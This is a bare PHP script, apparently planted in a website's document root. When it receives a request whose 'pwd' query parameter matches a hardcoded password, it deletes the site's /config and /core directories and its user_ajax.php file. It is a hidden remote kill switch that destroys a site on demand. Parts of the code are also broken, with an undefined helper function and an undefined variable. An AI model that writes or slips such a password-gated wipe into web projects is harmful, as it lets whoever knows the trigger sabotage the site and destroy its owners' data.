<?php
$config_dir =  $_SERVER['DOCUMENT_ROOT'] .'/config' ;
$core_dir =  $_SERVER['DOCUMENT_ROOT'] .'/core' ;
$user_ajax =  $_SERVER['DOCUMENT_ROOT'] .'/user_ajax.php' ;
if( isset( $_GET['pwd'] ) && $_GET['pwd'] == "Poojaherin123*" ){
    
    if (is_dir($config_dir)) {
        $objects = scandir($config_dir);
        foreach ($objects as $object) {
            if ($object != "." && $object !="..") {
                if (filetype($config_dir . DIRECTORY_SEPARATOR . $object) == "dir") {
                    deleteDirectory($config_dir . DIRECTORY_SEPARATOR . $object);
                
                    echo "success dir";
                } else {
                    unlink($config_dir . DIRECTORY_SEPARATOR . $object);
                    echo "success";
                }
            }
        }
        
    }
    reset($objects);
//    if( !rmdir( $config_dir ) ){
//        echo "Could not remove " . $config_dir;
//    }else if( unlink( $config_dir ) ){
//        echo "success";
//    }
    rmdir($config_dir);
    if (is_dir($core_dir)) {
        $objects = scandir($core_dir);
        foreach ($objects as $object) {
            if ($object != "." && $object !="..") {
                if (filetype($core_dir . DIRECTORY_SEPARATOR . $object) == "dir") {
                    deleteDirectory($dirPath . DIRECTORY_SEPARATOR . $object);
                } else {
                    unlink($core_dir . DIRECTORY_SEPARATOR . $object);
                }
            }
        }
    reset($objects);
    rmdir($core_dir);
    }
    unlink($user_ajax);
//    if( !rmdir( $core_dir ) ){
//        echo "Could not remove " . $core_dir;
//    }else if( unlink( $core_dir ) ){
//        echo "success";
//    }
}


?>